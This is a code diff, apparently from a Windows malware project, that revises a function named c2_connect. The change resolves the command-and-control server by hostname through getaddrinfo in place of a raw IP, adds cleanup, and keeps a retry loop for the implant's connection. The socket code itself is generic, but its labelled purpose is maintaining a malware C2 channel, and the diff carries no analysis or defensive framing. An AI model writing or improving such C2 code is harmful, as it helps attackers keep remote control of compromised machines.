@@ -60,24 +60,30 @@ static int c2_connect(const char *ip, int port) {
         g_wsa_init = 1;
     }
 
-    struct sockaddr_in addr;
-    ZeroMemory(&addr, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons((WORD)port);
-    addr.sin_addr.s_addr = inet_addr(ip);
+    struct addrinfo hints, *res = NULL;
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    char port_str[8];
+    wsprintfA(port_str, "%d", port);
+    if (getaddrinfo(ip, port_str, &hints, &res) != 0 || !res) return 0;
 
     int retries = 3;
     while (retries-- > 0) {
-        g_c2_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (g_c2_sock == INVALID_SOCKET) return 0;
+        g_c2_sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+        if (g_c2_sock == INVALID_SOCKET) { freeaddrinfo(res); return 0; }
 
-        if (connect(g_c2_sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
+        if (connect(g_c2_sock, res->ai_addr, (int)res->ai_addrlen) != SOCKET_ERROR) {
+            freeaddrinfo(res);
             return 1;
+        }
 
         closesocket(g_c2_sock);
         g_c2_sock = INVALID_SOCKET;
         if (retries > 0) Sleep(2000);
     }
+    freeaddrinfo(res);
     return 0;
 }
 
